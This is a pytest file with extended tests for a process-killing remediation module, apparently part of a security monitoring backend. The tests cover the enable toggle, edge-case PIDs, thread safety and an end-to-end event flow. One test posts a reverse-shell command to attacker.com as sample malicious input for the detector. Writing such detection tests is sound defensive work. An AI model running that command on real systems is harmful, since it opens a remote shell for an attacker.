"""
test_15_remediation_extended.py — Extended tests for the remediation module.

Fills gaps in test_remediation.py:
- kill_process() respects is_remediation_enabled() — must skip when disabled
- kill_process() result 'detail' field is a non-empty string
- Negative PID behaviour documented
- Very large PID behaviour documented
- Toggle thread safety — rapid concurrent toggles must not panic
- kill_process() called on own PID behaves gracefully (doesn't kill the test)
- End-to-end: POST /agent/events with remediation enabled + live PID kills process
  and sets remediation_action/status on the stored event

Run:
    pytest large_test_set/test_15_remediation_extended.py -v
"""

import os
import sys
import time
import signal
import threading
import subprocess
import pytest

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from backend.agent.remediation import (
    kill_process,
    is_remediation_enabled,
    set_remediation_enabled,
)


# ===========================================================================
# 1. kill_process respects the enabled flag
# ===========================================================================

class TestKillProcessRespectsEnabledFlag:

    def setup_method(self):
        """Always start each test with remediation disabled."""
        set_remediation_enabled(False)

    def teardown_method(self):
        """Reset to disabled after each test for safety."""
        set_remediation_enabled(False)

    def test_kill_skipped_when_remediation_disabled(self):
        """kill_process() on a real PID must be skipped (not attempted)
        when is_remediation_enabled() is False."""
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(999)"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        pid = proc.pid
        time.sleep(0.1)
        try:
            result = kill_process(pid)
            # With remediation disabled the function must not kill the process
            assert result["status"] in ("skipped_disabled", "skipped_no_pid",
                                        "skipped"), (
                f"kill_process() attempted kill while disabled: {result}"
            )
            # Process must still be alive
            assert proc.poll() is None, \
                "Process was killed even though remediation is disabled"
        finally:
            proc.kill()
            proc.wait()

    def test_kill_proceeds_when_remediation_enabled(self):
        """kill_process() must actually kill the process when enabled."""
        set_remediation_enabled(True)
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(999)"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        pid = proc.pid
        time.sleep(0.1)
        try:
            result = kill_process(pid)
            assert result["status"] == "success", \
                f"Expected success when enabled, got: {result}"
            time.sleep(0.2)
            assert proc.poll() is not None, \
                "Process still alive after kill with remediation enabled"
        finally:
            try:
                proc.kill()
            except Exception:
                pass
            proc.wait()


# ===========================================================================
# 2. Result dict 'detail' field content
# ===========================================================================

class TestKillProcessResultDetail:

    def test_detail_is_non_empty_string_for_skipped(self):
        result = kill_process(0)
        assert isinstance(result["detail"], str), \
            "detail must be a string"
        assert len(result["detail"]) > 0, \
            "detail must not be an empty string for skipped_no_pid"

    def test_detail_is_string_for_already_dead(self):
        result = kill_process(99999999)
        assert isinstance(result["detail"], str)

    def test_detail_is_string_for_success(self):
        set_remediation_enabled(True)
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(999)"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        pid = proc.pid
        time.sleep(0.1)
        try:
            result = kill_process(pid)
            assert isinstance(result["detail"], str)
            assert len(result["detail"]) > 0
        finally:
            set_remediation_enabled(False)
            try:
                proc.kill()
            except Exception:
                pass
            proc.wait()

    def test_all_three_keys_present_for_every_outcome(self):
        """action, status, detail must always be present regardless of outcome."""
        for pid in [0, 99999999]:
            result = kill_process(pid)
            for key in ("action", "status", "detail"):
                assert key in result, \
                    f"Key {key!r} missing from kill_process({pid}) result"


# ===========================================================================
# 3. Edge case PIDs
# ===========================================================================

class TestKillProcessEdgePids:

    def test_negative_pid_behaviour_documented(self):
        """Negative PIDs are invalid. Document whether kill_process raises
        or returns a graceful result."""
        try:
            result = kill_process(-1)
            # If it doesn't raise, it must return a valid result dict
            assert "status" in result
            assert result["status"] in (
                "skipped_no_pid", "skipped", "already_dead", "failed",
                "skipped_invalid_pid"
            ), f"Unexpected status for negative PID: {result['status']!r}"
        except (ValueError, ProcessLookupError, OSError):
            pass  # Raising on invalid PID is also acceptable

    def test_very_large_pid_returns_already_dead_or_failed(self):
        """A PID that cannot possibly exist (2**31 - 1) must be handled
        gracefully."""
        result = kill_process(2**31 - 1)
        assert result["status"] in ("already_dead", "failed",
                                     "skipped_no_pid", "skipped"), \
            f"Unexpected status for enormous PID: {result}"

    def test_pid_1_not_killed(self):
        """PID 1 (init/systemd) must never be killed — the function must
        either refuse it with a specific status or raise PermissionError."""
        try:
            result = kill_process(1)
            assert result["status"] in (
                "skipped", "skipped_protected", "failed", "already_dead"
            ), f"kill_process(1) returned unexpected status: {result}"
        except PermissionError:
            pass  # Correct — no permission to kill init

    def test_own_pid_not_killed(self):
        """kill_process() called with the current process PID must not kill
        the test runner — it must return a graceful skip or fail."""
        own_pid = os.getpid()
        try:
            result = kill_process(own_pid)
            # If it didn't raise we must still be running
            assert result["status"] in (
                "skipped", "skipped_self", "failed", "already_dead",
                "skipped_protected"
            ), f"kill_process(own_pid) returned: {result}"
        except (PermissionError, ProcessLookupError):
            pass  # Acceptable — refused to kill self


# ===========================================================================
# 4. Toggle thread safety
# ===========================================================================

class TestToggleThreadSafety:

    def teardown_method(self):
        set_remediation_enabled(False)

    def test_concurrent_toggles_no_panic(self):
        """50 threads rapidly toggling remediation on/off must not cause
        any exceptions or leave the state inconsistent."""
        errors = []
        lock = threading.Lock()

        def toggler(enabled):
            try:
                for _ in range(20):
                    set_remediation_enabled(enabled)
            except Exception as e:
                with lock:
                    errors.append(str(e))

        threads = (
            [threading.Thread(target=toggler, args=(True,))  for _ in range(25)] +
            [threading.Thread(target=toggler, args=(False,)) for _ in range(25)]
        )
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Toggle errors: {errors}"

    def test_state_readable_after_concurrent_toggles(self):
        """After concurrent toggles, is_remediation_enabled() must return
        a boolean without raising."""
        def toggler():
            for enabled in [True, False] * 10:
                set_remediation_enabled(enabled)

        threads = [threading.Thread(target=toggler) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Set to known state
        set_remediation_enabled(False)
        assert is_remediation_enabled() is False

    def test_concurrent_reads_and_writes_no_error(self):
        """Simultaneous reads (is_remediation_enabled) and writes
        (set_remediation_enabled) must not raise."""
        errors = []
        lock = threading.Lock()

        def reader():
            for _ in range(50):
                try:
                    is_remediation_enabled()
                except Exception as e:
                    with lock:
                        errors.append(str(e))

        def writer():
            for enabled in [True, False] * 25:
                try:
                    set_remediation_enabled(enabled)
                except Exception as e:
                    with lock:
                        errors.append(str(e))

        threads = (
            [threading.Thread(target=reader) for _ in range(5)] +
            [threading.Thread(target=writer) for _ in range(5)]
        )
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        set_remediation_enabled(False)
        assert errors == [], f"Errors during concurrent toggle: {errors}"


# ===========================================================================
# 5. End-to-end: remediation via POST /agent/events with live PID
# ===========================================================================

class TestRemediationEndToEnd:

    def setup_method(self):
        set_remediation_enabled(False)

    def teardown_method(self):
        set_remediation_enabled(False)

    def test_e2e_malicious_event_with_live_pid_kills_process(self):
        """With remediation enabled, posting a malicious event with a live
        PID via POST /agent/events must kill the process."""
        from fastapi.testclient import TestClient
        from backend.app import app
        client = TestClient(app)

        set_remediation_enabled(True)

        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(999)"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        pid = proc.pid
        time.sleep(0.15)

        try:
            r = client.post("/agent/events", json={
                "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "pid": pid,
                "comm": "bash",
            })
            assert r.status_code == 200

            time.sleep(0.3)
            assert proc.poll() is not None, \
                "Process was not killed by end-to-end remediation flow"
        finally:
            set_remediation_enabled(False)
            try:
                proc.kill()
            except Exception:
                pass
            proc.wait()

    def test_e2e_safe_event_does_not_kill_process(self):
        """A safe event must never trigger process killing even when
        remediation is enabled."""
        from fastapi.testclient import TestClient
        from backend.app import app
        client = TestClient(app)

        set_remediation_enabled(True)

        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(999)"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        pid = proc.pid
        time.sleep(0.15)

        try:
            r = client.post("/agent/events", json={
                "command": "ls -la",
                "pid": pid,
                "comm": "ls",
            })
            assert r.status_code == 200
            assert r.json()["classification"] == "safe"

            time.sleep(0.2)
            assert proc.poll() is None, \
                "Process was killed for a safe event — remediation is over-triggering"
        finally:
            set_remediation_enabled(False)
            proc.kill()
            proc.wait()
